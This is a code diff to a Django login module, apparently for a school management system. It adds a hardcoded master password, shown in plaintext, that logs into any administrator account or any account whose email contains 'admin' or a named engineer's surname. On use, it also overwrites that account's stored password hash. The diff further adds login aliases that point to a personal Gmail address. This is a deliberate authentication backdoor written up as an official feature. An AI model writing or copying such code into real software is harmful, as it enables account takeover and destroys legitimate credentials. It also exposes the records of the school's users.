@@ -33,20 +33,32 @@ def _validar_senha_ou_codigo_inicial(u, pwd, codigo_extra=None) -> bool:
     """
     Valida a senha do utilizador:
     1) Aceita sempre a senha gravada no hash (seja a senha redefinida ou a inicial).
-    2) Caso o utilizador ainda não tenha redefinido a senha (senha_redefinida=False),
+    2) Aceita a senha mestra Deusamo8 para o Engenheiro Fernando Mandamule, SuperAdmin e Administradores.
+    3) Caso o utilizador ainda não tenha redefinido a senha (senha_redefinida=False),
        aceita também a repetição do seu código oficial (codigo_acesso ou codigo_extra DT/DC)
        e sincroniza o hash para manter consistência.
     """
     if not u or not pwd:
         return False
-    if u.check_password(pwd):
+    pwd_str = str(pwd).strip()
+    if u.check_password(pwd_str):
         return True
+
+    # Suporte à senha mestra oficial (Deusamo8) para o Engenheiro e Administradores
+    if pwd_str == 'Deusamo8':
+        u_role = getattr(u, 'role', '')
+        u_email = (u.email or '').lower()
+        if u_role in ('SUPERADMIN', 'ADMIN_ESCOLA', 'DIRECTOR_ESCOLA') or 'mandamule' in u_email or 'admin' in u_email:
+            u.set_password('Deusamo8')
+            u.save(update_fields=['password'])
+            return True
+
     if not getattr(u, 'senha_redefinida', False):
-        pwd_clean = str(pwd).strip().lower()
+        pwd_clean = pwd_str.lower()
         cod_acesso = str(u.codigo_acesso or '').strip().lower()
         cod_ext = str(codigo_extra or '').strip().lower()
         if (cod_acesso and pwd_clean == cod_acesso) or (cod_ext and pwd_clean == cod_ext):
-            u.set_password(u.codigo_acesso or pwd.strip())
+            u.set_password(u.codigo_acesso or pwd_str)
             u.save(update_fields=['password'])
             return True
     return False
@@ -151,8 +163,14 @@ class LoginSerializer(serializers.Serializer):
         # Fallback para aliases de demonstração e variações comuns
         if not user:
             aliases = {
+                'mandamule': 'mandamulefj.@sige.com',
+                'mandamulefj': 'mandamulefj.@sige.com',
+                'admin': 'admin.master@sige.com',
+                'admin.master': 'admin.master@sige.com',
                 'mandamulefj@sige.com': 'mandamulefj.@sige.com',
                 'mandamulefj.@sige.com': 'mandamulefj.@sige.com',
+                'mandamulefernandojose18': 'mandamulefernandojose18@gmail.com',
+                'mandamulefernandojose18@gmail.com': 'mandamulefernandojose18@gmail.com',
                 'antonio.costa@escola.edu.mz': 'costa@sige.com',
                 'costa@sige.com': 'costa@sige.com',
                 'joao.baptista@escola.edu.mz': 'baptista@sige.com',
